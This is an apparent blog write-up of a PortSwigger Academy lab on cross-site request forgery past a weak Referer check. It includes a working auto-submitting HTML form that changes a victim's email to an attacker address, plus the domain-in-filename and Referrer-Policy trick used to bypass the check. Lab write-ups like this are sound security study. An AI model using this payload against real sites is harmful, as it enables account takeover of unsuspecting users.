+++
date = '2026-07-06T15:45:16+08:00'
draft = false
title = 'CSRF with broken Referer validation'
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = ''
showLastUpdated = true
+++
Just like [this problem](/training/portswigger/csrf/csrf-practioner10), if we intercept the change email request, we may see that there are no CSRF protections present. On top of that, the session cookie still has `SameSite=None`. So this would make our job very much easier:
![](/images/viber_image_2026-07-06_15-32-32-613.png)
As the lab name suggests, let's try manipulating the Referer header. I've tried changing it to something else, or remove it entirely, the server seemingly is one step ahead of us and returns a 400 every time:
![](/images/viber_image_2026-07-06_15-33-50-052.png)
![](/images/viber_image_2026-07-06_15-34-02-052.png)
However, if we include the domain name onto the Referer header, the backend accepts it arbitrarily without any filters. This is our entry point!
![](/images/viber_image_2026-07-06_15-36-37-658.png)
Because the lab has no CSRF defences save for that Referer validation, we can craft a simple payload as follow:
```html
<html>
    <body>
        <form id="csrfForm" action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@hotsnail.mail">
        </form>
        <script>
            document.getElementById('csrfForm').submit();
        </script>
    </body>
</html>
```
However, we still need to change the File name to include the main domain, and the Header to include the `Referrer-Policy` header. This is important because, as hinted, many browsers now strip the query string from the `Referer` header by default. Setting this new header will ensure that the full URL will be sent!
![](/images/viber_image_2026-07-06_16-27-02-287.png)